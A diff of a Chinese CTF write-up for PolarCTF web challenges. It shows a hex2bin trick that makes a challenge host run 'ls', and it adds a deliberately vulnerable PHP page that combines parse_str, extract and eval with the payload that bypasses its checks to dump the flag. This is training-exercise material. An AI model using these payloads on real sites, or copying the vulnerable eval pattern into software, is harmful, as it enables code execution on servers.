@@ -20,7 +20,38 @@ $IFS空格绕过+sort读取文件
 hex2bin转换
 `http://1ae67e55-509c-49e4-9bf7-a04be9788ca5.www.polarctf.com:8090/?args1=hex2bin&args2='73797374656d'&args3='ls'`
 
-### 
+### php是世界上最好的语言
+变量覆盖
+```php
+<?php
+//flag in $flag
+highlight_file(__FILE__);
+include("flag.php");
+$c=$_POST['sys'];
+$key1 = 0;
+$key2 = 0;
+if(isset($_GET['flag1']) || isset($_GET['flag2']) || isset($_POST['flag1']) || isset($_POST['flag2'])) {
+    die("nonononono");
+}
+@parse_str($_SERVER['QUERY_STRING']);
+extract($_POST);
+if($flag1 == '8gen1' && $flag2 == '8gen1') {
+    if(isset($_POST['504_SYS.COM'])){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\?/", $c)){
+         eval("$c");  
+
+    }
+}
+}
+?>
+```
+
+```http
+http://www.xxx.com?_POST[flag1]=8gen1&_POST[flag2]=8gen1
+post:sys=echo($flag);&504[SYS.COM=a
+```
+
+
 
 # reverse
 
